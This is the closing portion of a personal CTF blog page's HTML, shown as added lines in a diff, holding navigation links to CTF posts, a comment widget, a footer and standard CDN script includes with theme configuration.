+    <div class="post-nav"><a href="/posts/intro/" class="prev" rel="prev" title="K!nd4SUS CTF 2025"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>K!nd4SUS CTF 2025</a>
+            <a href="/posts/htb/" class="next" rel="next" title="Hackthebox: Cyber Apocalypse CTF 2025: Tales from Eldoria">Hackthebox: Cyber Apocalypse CTF 2025: Tales from Eldoria<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yourusername" target="_blank">cr0nica1</a></span>&nbsp;|&nbsp;<span class="license">Content licensed by cr0nica1</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.5.3/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":80},"comment":{"valine":{"appId":"your-leancloud-appId","appKey":"your-leancloud-appKey","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@15.1.2/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Comment...","recordIP":false,"visitor":true}},"data":{"id-1":"Cr0nica1","id-2":"Cr0nica1"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":true,"left":"$$","right":"$$"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"},{"display":false,"left":"$","right":"$"}],"strict":false},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.bfc24322c1c736fc87270bfd02b29a3f1ec4316ce28d843a95e7f86122d3014725629b2cbba45f999fae1ec040433cefdf4a20bf2bf2aae4698cb1e66eafeb42.js" integrity="sha512-v8JDIsHHNvyHJwv9ArKaPx7EMWzijYQ6lef4YSLTAUclYpssu6RfmZ+uHsBAQzzv30ogvyvyquRpjLHmbq/rQg=="></script></body>
+</html>
